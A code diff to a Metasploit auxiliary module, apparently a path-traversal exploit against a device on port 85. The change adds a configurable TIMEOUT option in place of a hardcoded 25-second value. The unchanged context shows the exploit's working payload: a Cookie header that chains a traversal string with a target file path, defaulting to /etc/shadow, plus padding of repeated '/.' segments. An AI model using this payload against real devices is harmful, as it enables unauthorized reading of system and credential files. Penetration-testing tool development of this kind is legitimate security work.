@@ -35,9 +35,14 @@ class Metasploit3 < Msf::Auxiliary
     register_options(
       [
         Opt::RPORT(85),
-        OptString.new('FILEPATH', [false, 'The name of the file to download', '/etc/shadow']),
-        OptInt.new('DEPTH', [true, 'Traversal depth', 10])
+        OptString.new('FILEPATH', [ false, 'The name of the file to download', '/etc/shadow' ]),
+        OptInt.new('DEPTH', [ true, 'Traversal depth', 10 ]),
+        OptInt.new('TIMEOUT', [ false, "The timeout in seconds waiting for the device to respond", 25 ])
       ], self.class)
+  end
+
+  def timeout
+    datastore['TIMEOUT'] || 25
   end
 
   def run_host(ip)
@@ -60,7 +65,7 @@ class Metasploit3 < Msf::Auxiliary
           'Accept-Encoding' => "zip,deflate",
           'Cookie' => "PHPSESSID=af0402062689e5218a8bdad17d03f559; lang=owned" + travs + datastore['FILEPATH'] + "/."*4043
         },
-    }, 25)
+    }, timeout)
 
     print_status "File retreived successfully!"
 
